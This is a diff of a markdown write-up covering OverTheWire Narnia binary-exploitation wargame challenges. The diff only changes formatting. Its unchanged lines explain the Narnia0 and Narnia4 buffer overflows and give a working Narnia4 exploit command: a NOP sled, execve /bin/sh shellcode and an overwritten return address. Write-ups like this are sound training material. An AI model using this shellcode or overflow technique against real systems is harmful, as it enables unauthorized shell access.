@@ -1,5 +1,7 @@
 # Binary Exploitation/Pwn challenges from OverTheWire
 
+<div align="justify">
+
 ## Narnia0
 
 We have a `char buf[20]` buffer, but the input is taken as `scanf("%24s",&buf);` and we know that the shell is only executed when the val is at **0xdeadbeef**.
@@ -94,8 +96,6 @@ cat /tmp/yourfile
 
 ## Narnia4
 
-<div align="justify">
-
 This challenge is similar to Narnia2, so also here we have a char </span> `buffer[256]` that we must overflow to overwrite the `strcpy(buffer,argv[1])` return address, but the main difference is that here there are also other buffer of strings to overwrite before we can change it.
   
 First of all we must see when the program goes in segmentation fault: with some test using
@@ -129,5 +129,5 @@ Now we can prepare the argv[1] to pass to the program: 239 bytes of '\x90' + 25 
   ```bash
   ./narnia4 $(python -c "print('\x90'*239+'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'+'\x18\xd8\xff\xff')")
   ```
+
 </div>
-  
